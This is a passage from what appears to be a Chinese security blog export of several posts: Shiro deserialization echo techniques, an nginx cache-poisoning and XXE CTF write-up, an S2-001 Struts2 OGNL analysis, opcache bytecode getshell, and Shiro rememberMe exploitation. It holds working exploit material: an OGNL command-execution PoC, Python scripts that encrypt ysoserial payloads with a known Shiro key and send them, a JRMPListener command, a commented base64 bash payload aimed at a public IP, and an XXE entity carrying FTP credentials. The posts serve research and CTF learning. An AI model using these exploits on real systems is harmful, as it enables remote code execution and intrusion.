'{if($10&gt;0)print}'|grep -i %s|awk '{print $10}'`;b=`ls -l /proc/$PPID/fd|grep $a|awk '{print $9}'`;echo -n $b 往文件描述中写数据现在假设shiro存在反序列化并且所用gadget的末端是走的TemplatesImpl，那么我们可以把ysoserial中的硬编码的命令执行改成下面这样的代码执行。 1234567891011121314151617181920212223242526272829303132String[] cmd = { \"/bin/sh\", \"-c\", \"a=`cat /proc/$PPID/net/tcp6|awk '{if($10&gt;0)print}'|grep -i %s|awk '{print $10}'`;b=`ls -l /proc/$PPID/fd|grep $a|awk '{print $9}'`;echo -n $b\"};java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();java.io.InputStreamReader isr = new java.io.InputStreamReader(in);java.io.BufferedReader br = new java.io.BufferedReader(isr);StringBuilder stringBuilder = new StringBuilder();String line;while ((line = br.readLine()) != null){ stringBuilder.append(line);}int num = Integer.valueOf(stringBuilder.toString()).intValue();cmd = new String[]{\"/bin/sh\",\"-c\",\"ifconfig\"};in = Runtime.getRuntime().exec(cmd).getInputStream();isr = new java.io.InputStreamReader(in);br = new java.io.BufferedReader(isr);stringBuilder = new StringBuilder();while ((line = br.readLine()) != null){ stringBuilder.append(line);}String ret = stringBuilder.toString();java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});c.setAccessible(true);java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(num)}));os.write(ret.getBytes());os.close(); 我这种低配版指令ifconfig后效果实现效果如下，服务端会直接返回数据并断掉连接，所以没有了后面http响应包，requests库无法识别返回的内容报错。 总结 我这种方法因为需要保证请求源端口，所以没办法按照图中师傅实现的一样在burp中（burp代理后发起请求的端口不可控）。同样的道理如果脆弱的shiro应用在反代后面，因为反代的源端口不可预测所以没办法用这种低配版方案拿到回显。但实际情况不出网的shiro肯定是在内网里面的，所以从这角度想想还有点鸡肋，就当抛砖引玉了～ 在上面引用的文章中提到了 “jvm所有的对象都存储在堆内存中，也许可以通过某种方法直接获取存储在堆内存中的socket对象实现回显”，我猜可以在burp里面利用的情况应该是通过某种黑魔法获取到了本次请求的socket对象了（或者是更底层的方法）所以才不要以客户端源口作为过滤条件。 写到这忽然想起，那个图片payload貌似没有打码，或许把payload用shiro常见的密钥撞一下撞可以看到标准版思路的片段？体力不够，溜了。 研究这个问题时候也请教了相关的大哥接收到了一些提示，因为属于他人知识产权，文章并未提及。在此谢过指点我的大哥们。","link":"/2020/02/24/linux%E4%B8%8Bjava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%8E%E9%85%8D%E7%89%88%E5%AE%9E%E7%8E%B0/"},{"title":"nginx的秘密wp","text":"第一步，web缓存漏洞完成一步需三个点结合。 第一点： 观察到static有存在目录穿越漏洞，虽然没开autoindex但依然可以通过/static../etc/passwd下载文件。结合提示从nginx的配置开始，可以想到下载nginx.conf，下载的路径是默认的nginx安装路径/static../etc/nginx/nginx.conf。可以看到nginx配置，diff一下可以看到关键点在 123456789101112131415161718192021222324proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off; limit_conn_zone $binary_remote_addr zone=conn:10m; limit_req_zone $binary_remote_addr zone=allips:10m rate=2r/s; server { listen 4455 default_server; server_name localhost; location /static { alias /home/; } location ~* \\.(css|js|gif|png){ proxy_cache my_cache; proxy_cache_valid 200 30s; proxy_pass http://bugweb.app:8000; proxy_set_header Host $host:$server_port; proxy_ignore_headers Expires Cache-Control Set-Cookie; } location / { limit_conn conn 20; proxy_pass http://bugweb.app:8000; proxy_set_header Host $host:$server_port; } } 第二点 通过一些方法发现路由映射和些小问题。例如在扫描目录的时候可以发现这些。 登陆后访问发现，这些路由都是访问的edit页面，随便测editxxx发现也映射到相同的页面。猜测后台路由的逻辑是只要访问的是以edit开头都相当于访问edit。 第三点： 有一个post_bug，这个点的功能是给提交bug给管理员，管理员会点击查看。有一个write_plan可以写一些东西，其他人看不见。如果你访问过/user/admin还会发现一个小tip管理员说自己已经把所有密码写在秘密计划里面了。 三个点结合起来可以触发web缓存漏洞。发送http://xxxxx/write_plan/23333.png后立即访问就可以看到管理员的秘密计划。 看到的东西如下 拿到内网ftp服务器的账号密码。 syc10ver Eec5TN9fruOOTp2G 。 第二步，xxe的两个协议如果有师傅把第一步做出来了，相信下面的操作也很简单了。虽然题目提示给的是从nginx开始，但是我总是感觉很多师傅第一个找到的漏洞点是xxe。触发点在上传计划那里，xml文件中的外部实体可以被解析。 之所以要多出一步，是我觉得有两个tip还是有些师傅没（强）有（行）关（增）注（加）到（难度）。 url的完整的形式是scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment] proc伪文件中有arp信息 我这里用的解析xml的python库加载外部实体的时候用的是urlopen，如果没记错的话只支持ftp，http，file。上传 读目录，把两个ip都试试 12345678&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE person [&lt;!ENTITY remote SYSTEM\"ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.2/\"&gt;]&gt;&lt;plans&gt; &lt;plan&gt; &lt;content&gt;payload &amp;remote;&lt;/content&gt; &lt;/plan&gt;&lt;/plans&gt; 读flag 最后get flag","link":"/2018/06/26/nginx%E7%9A%84%E7%A7%98%E5%AF%86wp/"},{"title":"s2-001 代码分析","text":"环境搭建 pom.xml中加入 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;/groupId&gt; &lt;artifactId&gt;struts2-core&lt;/artifactId&gt; &lt;version&gt;2.0.8&lt;/version&gt;&lt;/dependency&gt; index.jsp 12345678910111213141516171819&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt;&lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\" %&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;S2-001&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;S2-001 Demo&lt;/h2&gt;&lt;p&gt;link: &lt;a href=\"https://cwiki.apache.org/confluence/display/WW/S2-001\"&gt;https://cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;&lt;s:form action=\"login\"&gt; &lt;s:textfield name=\"username\" label=\"username\" /&gt; &lt;s:textfield name=\"password\" label=\"password\" /&gt; &lt;s:submit&gt;&lt;/s:submit&gt;&lt;/s:form&gt;&lt;/body&gt;&lt;/html&gt; welcome.jsp 12345678910111213&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt;&lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\" %&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;S2-001&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Hello &lt;s:property value=\"username\"&gt;&lt;/s:property&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; struts.xml 12345678910111213&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN\" \"http://struts.apache.org/dtds/struts-2.0.dtd\"&gt;&lt;struts&gt; &lt;package name=\"s2-001\" extends=\"struts-default\"&gt; &lt;action name=\"login\" class=\"com.example.s2001.LoginAction\"&gt; &lt;result name=\"success\"&gt;welcome.jsp&lt;/result&gt; &lt;result name=\"error\"&gt;index.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; web.xml 12345678910111213141516171819&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\" id=\"WebApp_ID\" version=\"3.1\"&gt; &lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt;&lt;/web-app&gt; LoginAction.java 1234567891011121314151617181920212223242526272829303132333435package com.example.s2001;import com.opensymphony.xwork2.ActionSupport;public class LoginAction extends ActionSupport { private String username = null; private String password = null; public String getUsername() { return this.username; } public String getPassword() { return this.password; } public void setUsername(String username) { this.username = username; } public void setPassword(String password) { this.password = password; } public String execute() throws Exception { if ((this.username.isEmpty()) || (this.password.isEmpty())) { return \"error\"; } if ((this.username.equalsIgnoreCase(\"admin\")) &amp;&amp; (this.password.equals(\"admin\"))) { return \"success\"; } return \"error\"; }} 访问 http://localhost:8888/s2_001_war_exploded/ 漏洞复现username 随便填，password填poc，注意需要url编码 123456789101112%{ #a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;pwd&quot;})).redirectErrorStream(true).start(), #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e), #f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;), #f.getWriter().println(new java.lang.String(#e)), #f.getWriter().flush(), #f.getWriter().close()} 效果如下 预备知识-OGNLs2的很多rce洞都是提交的ognl表达式被服务端解析执行而造成，有必要在之前先作一定的了解。 介绍OGNL全称是对象视图导航语言（Object-Graph Navigation Language），它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 的使用传统的OGNL可以放一个Object到root，放一个Map到values（很多文章都叫它Context）。 获取root、Context的值或执行其内部方法的方式都差不多，唯一的区别就是获取Context下的信息时需要加前缀#key或@key(静态变量，静态方法)，看下面例子。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package com.example.ognltest;import ognl.Ognl;import ognl.OgnlContext;import ognl.OgnlException;import java.util.HashMap;import java.util.Map;public class OgnlTest { public static void main(String[] args) throws OgnlException { User.fun1(); }}class User { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } public User(String name) { this.name = name; } public static void fun1() throws OgnlException { //准备root User u1 = new User(\"user1\"); //准备context Map&lt;String,User&gt; context = new HashMap&lt;String,User&gt;(); context.put(\"key\", new User(\"user2\")); //设置root和context OgnlContext ognl = new OgnlContext(); ognl.setRoot(u1); ognl.setValues(context); //取出root中的数据，直接写属性名 String rootname = (String) Ognl.getValue(\"name\", ognl, ognl.getRoot()); System.out.println(rootname); //取出context中的属性值 //#代表从context中取值 String contextname = (String) Ognl.getValue(\"#key.name\", ognl, ognl.getRoot()); System.out.println(contextname); //修改root中数据 Ognl.getValue(\"name = 'user3'\", ognl, ognl.getRoot()); rootname = (String) Ognl.getValue(\"name\", ognl, ognl.getRoot()); System.out.println(rootname); //修改context中数据 Ognl.getValue(\"#key.name = 'user4'\", ognl, ognl.getRoot()); contextname = (String) Ognl.getValue(\"#key.name\", ognl, ognl.getRoot()); System.out.println(contextname); //调用root中方法 Ognl.getValue(\"setName('user5')\", ognl, ognl.getRoot()); rootname = (String)Ognl.getValue(\"whoami()\", ognl, ognl.getRoot()); System.out.println(rootname); //调用context中方法 Ognl.getValue(\"#key.setName('user6')\", ognl, ognl.getRoot()); contextname = (String)Ognl.getValue(\"#key.whoami()\", ognl, ognl.getRoot()); System.out.println(contextname); //调用静态方法 String funcreturnvalue = (String) Ognl.getValue(\"@com.example.ognltest.User@func2()\", ognl, ognl.getRoot()); System.out.println(funcreturnvalue); //调用静态属性 Double pi = (Double) Ognl.getValue(\"@java.lang.Math@PI\", ognl, ognl.getRoot()); System.out.println(pi); } public String whoami(){ return \"I'm \" + this.name; } public static String func2(){ return \"Call static method func2\"; }} 输入结果 12345678user1user2user3user4I'm user5I'm user6Call static method func23.141592653589793 struts2中的OGNL在Struts2 中有个值栈对象即ValueStack。而说得通俗些，这个值栈就是OgnlContext。ValueStack内部封装了一个CompoundRoot类型的对象作为root属性，CompoundRoot是一个继承ArrayList的栈存储结构。而所有被压入栈中的对象，都会被视为OGNL的Root对象。在使用OGNL计算表达式时，首先会将栈顶元素作为Root对象，进行表达式匹配，匹配不成功则会依次向下匹配，最后返回第一个成功匹配的表达式计算结果。因此，Struts2通过ValueStack实现了多Root对象的OGNL操作。 当你提交一个请求，会为这个请求创建一个和web容器交互的ActionContext，与此同时会创建ValueStack，并置于ActionContext之中。而实例化Action之后，就会将这个action对象压入ValueStack中。在请求“映射”过程中，Struts2则是通过ParametersInterceptor拦截器将提交的参数值封装入对应的Action属性中。因此action实例可以作为OGNL的Root对象，对于Action中的属性、方法都可以使用OGNL来获取。 代码分析首先是下断点的位置，在自己尝试调试之前，读取了一些前人的文章，他们的断点的位置大部分都在com/opensymphony/xwork2/interceptor/ParametersInterceptor.class的doIntercept方法上面。 琢磨了一下断点打在ParametersInterceptor拦截器这里的好处 不用调试tomcat自身的代码，这里下断点已是tomcat已经把“控制权”移交给strust之后了。 拦截器只能对action请求起作用，而过滤器则可以对几乎所有的请求起作用（一开始想的是在web.xml中配置的struts2过滤器org.apache.struts2.dispatcher.FilterDispatcher处打断点） ParametersInterceptor是拦截器，在这里下断点刚好是在执行业务逻辑之前，并且ParametersInterceptor是struts2的缺省会用到的拦截器之一。 ParametersInterceptor拦截器的作用是把传来的参数赋值给POJO，所以这里是payload“入侵”的起点。 xx 接下来会进行很多tomcat的内部操作，这里单步跟进IDEA会找不到相应的代码，一开始卡这了，后来看了别人的文章也遇到过这种情况。 文章提到多次步入，复现的时候一直至少跟了几十次步入也没跟到文章所述位置，估计实际搞要点几百次吧，直接定位到rg.apache.struts2.views.jsp.ComponentTagSupport下断点跳了。 可以看出来这里实际上是解析jsp模版了，先解析的是jsp中username框，后解析的是password框，我们是从password传入的payload所以第一次先跳过。最终触发点是在doEndTag时的操作，仔细看看 eveluateParams处理传入的参数 默认支持altSyntax，所以会把pssword变成%{password}当ogln表达式解析。（struts.tag.altSyntax 该属性指定是否允许在Struts 2标签中使用表达式语法,因为通常都需要在标签中使用表达式语法,故此属性应该设置为true,该属性的默认值是true） 跟入addParameter时的findValue 问题处在while True + Stack.findValue造成了对ogln的递归解析 第一次，提取出%{password}内容即payload 第二次，把提出来的payload再次当ognl表达式执行，触发RCE 参考从零开始学习Struts2 S2-001【Struts2-命令-代码执行漏洞分析系列】S2-001IDEA中创建maven项目没有java和resources子文件的解决OGNLStruts2学习之OGNL表达式JSP九大内置对象分析S2-001调试分析","link":"/2019/10/09/s2-001%20%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"},{"title":"opcache缓存getshell","text":"opcache是啥opencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件有就直接用） 动手配置在php.ini，打开有关opcache的选项（即保持默认），然后修改以下两项。 12opcache.file_cache_only = 1 #默认是0，设置为1后强制所有缓存以文件形式存在，否则可能缓存可能会存在于内存中opcache.file_cache = /tmp/cache #默认为空，这个目录php不会帮我们创建，一定要自己手动创建 缓存路径简单的举个栗子，比如我们访问/var/www/html/index.php，那么字节缓存的路径是/tmp/cache/[system_id]/var/www/html/index.php.bin。其中system_id，由php veriosn，Zend Extension Build，System（系统架构）三部分决定。这三样的东西都可以在phpinfo找到。具体的自动化生成脚本可以在github的这个项目中找到。在下文中把字节码文件简称问bin文件，把与之对应的php文件简称为源文件。 利用方法正如上面提到的，在opcache机制下，有bin文件会直接执行bin文件，那么如果配合上传漏洞这一类漏洞是不是达到将bin写到指定目录，然后访问相应的php文件达到隐蔽getshell的目的？ 利用的限制根据前面的描述，我们可以总结如下的限制条件 opcache要打开(php7自带但默认不打开) opcache.file_cache_only = 1 知道systemid，opcache缓存目录 类文件上传漏洞 知道bin文件所对应php的时间戳（一个秒级时间戳，这点稍后会解释） 前三点可以通过phpinfo直接或计算得知，重点说说第五点，在phpinfo中有个叫opcache.validate_timestamps的配置它默认为1，这应该是为安全性而考虑的，在bin文件在创建时会在文件内容中写入一个时间戳，这个时间戳跟源文件一样，在执行bin文件之前php会检查时间戳是否一致，如果不一致则丢弃重新创建bin文件。个人认为第五点是最苛刻的因为在cms闭源的情况下几乎不可猜。 bin文件结构分析依然在刚才给出的链接中下载分析模板，并在010editor中导入，不要用010editor自带的分析模板有坑。用红色框标注的地方就是和目标服务器不一样需要修改的地方，原谅我啰嗦一遍，这三个框分别代表system_id, 时间戳，路径。 实验验证kali phpinfo.phpubuntu phpinfo.php 拿到kali的phpinfo bin文件 修改时间戳 system_id 复制ubuntu相应文件中然后重新访问 CTF中这次在0ctf遇到了这种攻击方式，代码是这样的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?phperror_reporting(E_ALL);$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir)){ mkdir($dir);}if(!file_exists($dir . \"index.php\")){ touch($dir . \"index.php\");}function clear($dir){//如果不是目录就删除 if(!is_dir($dir)){ unlink($dir); return; }//删除非. ..的文件 foreach (scandir($dir) as $file) { if (in_array($file, [\".\", \"..\"])) { continue; } unlink($dir . $file); }//删除目录 rmdir($dir);}switch ($_GET[\"action\"] ?? \"\") { case 'pwd': echo $dir; break; case 'phpinfo': echo file_get_contents(\"phpinfo.txt\"); break; case 'reset': clear($dir); break; case 'time': echo time(); break; case 'upload': if (!isset($_GET[\"name\"]) || !isset($_FILES['file'])) { break; } echo \"go in to upload\"; if ($_FILES['file']['size'] &gt; 100000) { clear($dir); break; } $name = $dir . $_GET[\"name\"]; if (preg_match(\"/[^a-zA-Z0-9.\\/]/\", $name) || stristr(pathinfo($name)[\"extension\"], \"h\")) { break; } echo \"go in to move\"; var_dump($name); move_uploaded_file($_FILES['file']['tmp_name'], $name); $size = 0; foreach (scandir($dir) as $file) { if (in_array($file, [\".\", \"..\"])) { continue; } $size += filesize($dir . $file); } if ($size &gt; 100000) { clear($dir); } break; case 'shell': ini_set(\"open_basedir\", \"/var/www/html/$dir:/var/www/html/flag\"); include $dir . \"index.php\"; break; default: highlight_file(__FILE__); break;} ?action=phpinfo可以得到system_id7.0.28API3 151012,NTSBIN_SIZEOF_CHAR48888 -&gt; 7badddeddbd076fe8352e80d8ddf3e73 ?action=pwd 拿到自己路径sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/ 结合上面的两个进一步推断出缓存路径/tmp/cache/7badddeddbd076fe8352e80d8ddf3e73/var/www/html/sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/index.php 在自己本地环境中建立sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/index.php并写上自己的payload,切记这一点当时没有做出来就是本地没有建立一模一样的路径。目测都有ban函数，所以就纯写了一点东西，验证线上是否能输出。 然后测试了glob，发现没有结果最后用 读到目录，然后用之前给的代码中已经使用的high_light读文件（肯定不会被ban） 123&lt;?phphighlight_file(\"/var/wwwml/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad\");?&gt; 读出来又是是一个bin文件，不会逆。。。","link":"/2018/04/08/opcache%E7%BC%93%E5%AD%98getshell/"},{"title":"shiro 反序列化复现","text":"利用环境搭建12docker pull medicean/vulapps:s_shiro_1docker run -d -p 80:8080 medicean/vulapps:s_shiro_1 漏洞利用条件只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。 漏洞利用1234567891011121314151617181920212223242526272829303132333435363738394041424344import osimport reimport base64import uuidimport subprocessimport requestsfrom Crypto.Cipher import AESJAR_FILE = '/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'def poc(url, rce_command): if '://' not in url: target = 'https://%s' % url if ':443' in url else 'http://%s' % url else: target = url try: payload = generator(rce_command, JAR_FILE) # 生成payload r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10) # 发送验证请求 print r.text except Exception, e: pass return Falsedef generator(command, fp): if not os.path.exists(fp): raise Exception('jar file not found!') popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = \"kPH+bIxk5D2deZiIxcaaaA==\" mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == '__main__': #http://www.jackson-t.ca/runtime-exec-payloads.html poc('http://127.0.0.1:8080', 'open /Applications/Calculator.app') 动态分析环境搭建123git clone https://github.com/apache/shiro.gitgit checkout shiro-root-1.2.4cd ./shiro/samples/web mac 安装jdk6 https://juejin.im/post/5d550c5d51882504fb3022f7为了能动态调试需要在shiro/samples/web中添加 123456789101112131415161718192021&lt;!-- 需要设置编译的版本 --&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;!-- 这里需要将jstl设置为1.2 --&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt;&lt;dependencies&gt; 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;toolchains xmlns=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd&quot;&gt;&lt;!--插入下面代码--&gt; &lt;toolchain&gt; &lt;type&gt;jdk&lt;/type&gt; &lt;provides&gt; &lt;version&gt;1.6&lt;/version&gt; &lt;vendor&gt;sun&lt;/vendor&gt; &lt;/provides&gt; &lt;configuration&gt; &lt;!--这里是你安装jdk的文件目录--&gt; &lt;jdkHome&gt;/Library/Java/JavaVirtualMachines/1.6.0.jdk/&lt;/jdkHome&gt; &lt;/configuration&gt; &lt;/toolchain&gt;&lt;/toolchains&gt; Run Edit Configurations 添加TomcatServer(Local) Server中配置Tomcat路径 Deployment中添加Artifact 选择sample-web:war exploded 代码分析根据官网的叙述比较清楚了 加密convertPrincipalsToBytes 序列化具体 加密具体 加密用到encryptionCipherKey在构造方法中确定，其实就是DEFAULT_CIPHER_KEY_BYTES 加密用到的cipherService在对象初始化的时候确定为Aes加密 调用栈 解密getRememberedPrincipals 反序列化的起点 调用栈 漏洞的原生利用shiro自带的包是commons-collections3.2.1 其实原生情况下直接用ysoserial打会出现报错 报错的原因是 最开始的可以打成功的原因是，为了方便进行复现，搭建环境时手动添加了ysoserial支持的commons-collections4，所以复现起来才和喝水一样简单（橘子师傅原话） 解决这种问题的办法是使用JRMP，至于原因应该是 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections5 'touch /tmp/hack_shiro_jrmp' 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#coding:utf-8import osimport reimport base64import uuidimport subprocessimport requestsfrom Crypto.Cipher import AESJAR_FILE = '/Users/cengsiqi/Desktop/pentest/ysoserial-0.0.6-SNAPSHOT-all.jar'def poc(url, JRMPServerIp): if '://' not in url: target = 'https://%s' % url if ':443' in url else 'http://%s' % url else: target = url try: payload = generator(JRMPServerIp, JAR_FILE) # 生成payload r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10) # 发送验证请求 print r.text except Exception, e: pass return Falsedef generator(JRMPServerIp, fp): if not os.path.exists(fp): raise Exception('jar file not found!') #java -jar ysoserial-master-SNAPSHOT.jar JRMPClient '1.2.3.4:12345' popen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', JRMPServerIp], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = \"kPH+bIxk5D2deZiIxcaaaA==\" mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == '__main__': #http://www.jackson-t.ca/runtime-exec-payloads.html #poc('http://47.106.182.92:8080/', 'bash -c {echo,ZWNobyBgd2hvYW1pYCA+IC91c3IvbG9jYWwvdG9tY2F0L3dlYmFwcHMvUk9PVC9oYWNrLmpzcA==}|{base64,-d}|{bash,-i}') poc('http://127.0.0.1:8888/samples_web_war_exploded/', '127.0.0.1:12345') 然而本地测试的时候并未复现中，应该是gadget的问题，因为在加了commons-conllections4.0的环境用ysoserial的CommonsCollections2就可以成功。难道是环境没装好？ 后来仔细看了一下，确实是环境的问题，具体原因是打包成war的时候只会把compile和runtime的打包，而test的属于开发阶段需要使用的，从而不会打进去，而这里common-conllectons恰好属于test。所以生成环境中根本没有common-conllectons，因此是不可能打成功的。 此外注意到原生shiro，还自带CommonsBeanutils1.8.3，而CommonsBeanutils历史上是有gadget。 改了ysoserial的pom CommonsBeanutils成1.8.3又爆了新的错误 1234Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] from the thread context, current, or system/application ClassLoaders. All heuristics have been exhausted. Class could not be found. at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148) at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53) ... 51 more 所以立个flag：纯原生的shiro只是一个反序列化的触发点，没有完整gadget。因此需要结合其它依赖shiro的项目才有可能达到RCE的效果（比如jeecms） 其他解密脚本12345678910111213141516# pip install pycryptoimport sysimport base64from Crypto.Cipher import AESdef decode_rememberme(cookie): key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC cipher = base64.b64decode(cookie) IV = cipher[0:16] encryptor = AES.new(base64.b64decode(key), mode, IV=IV) remember_bin = encryptor.decrypt(cipher[16:]) return remember_binif __name__ == '__main__': cookie=&quot;&quot;&quot;&quot;&quot;&quot; print(decode_rememberme(cookie)[16:]) 1python decrypt.py cGhyYWNrY3RmREUhfiMkZA== | xxd DNS gadget验证漏洞1java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://yoursite 获取全版本解决SUID问题1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#coding:utf-8import requestsimport subprocessimport uuidimport base64import osfrom subprocess import Popen,PIPEfrom xml.dom.minidom import *from Crypto.Cipher import AESrepo_url = \"http://uk.maven.org/maven2/commons-beanutils/commons-beanutils/maven-metadata.xml\"mvn_home = \"/Users/cengsiqi/.m2/repository\"yso_path = \"/Users/cengsiqi/Desktop/pentest/ysoserial/target/classes\"gadget = \"CommonsBeanutils1\"command = 'touch /tmp/hack_shiro_CommonsBeanutils1'#key = \"kPH+bIxk5D2deZiIxcaaaA==\"key = \"4AvVhmFLUs0KTA3Kprsdag==\"target = \"http://172.16.247.129:8080/\"iv = uuid.uuid4().bytesres = requests.get(repo_url)html = res.contentroot = parseString(html.decode(\"utf-8\"))groupId = root.getElementsByTagName(\"groupId\")[0].firstChild.dataartifactId = root.getElementsByTagName(\"artifactId\")[0].firstChild.dataprint(groupId, artifactId)def encode(payload): BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() mode = AES.MODE_CBC encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(payload) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextfor i in root.getElementsByTagName(\"version\"): version = i.firstChild.data if version.find('-pre') &gt; -1: continue jar_path = mvn_home + '/' + groupId.replace('.', '/') + '/' + artifactId + '/' + version + '/' + artifactId + '-' + version + '.jar' print(jar_path) mvncmd = \"mvn dependency:get -DremoteRepositories=http://repo1.maven.org/maven2/ -DgroupId=%s -DartifactId=%s -Dversion=%s\" \\ % (groupId, artifactId, version) child = Popen(mvncmd, shell=True, stdout=PIPE, stderr=PIPE) child.wait() #yso_path, mvn_home, jar_path, gadget, command cmd2 = 